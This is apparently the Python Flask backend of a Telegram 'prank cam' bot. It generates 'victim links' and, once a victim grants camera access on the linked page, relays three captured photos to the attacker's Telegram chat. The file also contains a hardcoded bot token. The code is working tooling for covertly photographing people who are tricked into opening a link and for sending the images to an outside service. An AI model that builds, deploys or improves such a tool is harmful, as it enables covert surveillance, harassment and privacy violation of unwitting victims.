from flask import Flask, request, jsonify
import requests
import base64
from io import BytesIO
import uuid

app = Flask(__name__)

TOKEN = "8759505136:AAGAVvvts52UJcto01hnAJsv8B4U_1y7orU"
WEB_APP_BASE_URL = "https://prank-cam-bot.vercel.app"

@app.route('/', methods=['GET'])
def home():
    return "<h1>✅ Prank Cam Bot Backend Running on Vercel!</h1><p>Try /webhook and /send-photo</p>"

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        update = request.get_json(silent=True, force=True)
        if not update or 'message' not in update:
            return jsonify({"status": "ok"})

        message = update['message']
        chat_id = message.get('chat', {}).get('id')
        text = message.get('text', '').strip().lower()

        if text == '/start':
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                json={"chat_id": chat_id, "text": "🎉 Camera Prank Bot Ready!\n\nUse /generate to create victim link 😂"}
            )

        elif text == '/generate':
            unique_id = str(uuid.uuid4())[:8]
            link = f"{WEB_APP_BASE_URL}/?chat_id={chat_id}&id={unique_id}"

            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": f"🔥 Victim Prank Link Ready!\n\n{link}\n\nIs link ko victim ko bhej do.\nCamera allow karega to 3 photos tere paas aa jaayengi!",
                    "reply_markup": {
                        "inline_keyboard": [[{"text": "📸 Send this link to Victim", "url": link}]]
                    }
                }
            )

        return jsonify({"status": "ok"})
    except Exception as e:
        print("Webhook Error:", str(e))
        return jsonify({"status": "ok"})

@app.route('/send-photo', methods=['POST'])
def send_photo():
    try:
        data = request.get_json(silent=True, force=True)
        chat_id = data.get('chat_id')
        photo_base64 = data.get('photo')
        num = data.get('number', 1)

        if not chat_id or not photo_base64:
            return jsonify({"error": "missing data"}), 400

        # Convert base64 to image
        header, imgstr = photo_base64.split(',', 1)
        photo_bytes = base64.b64decode(imgstr)

        files = {'photo': ('prank.jpg', BytesIO(photo_bytes), 'image/jpeg')}
        caption = f"📸 Photo {num}/3 Captured! Prank Done 😂\nVictim ne camera allow kiya!"

        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
            data={'chat_id': chat_id, 'caption': caption},
            files=files
        )
        return jsonify({"status": "sent"})
    except Exception as e:
        print("Send Photo Error:", str(e))
        return jsonify({"error": "failed"}), 500

# For local testing only
if __name__ == "__main__":
    app.run(debug=True)
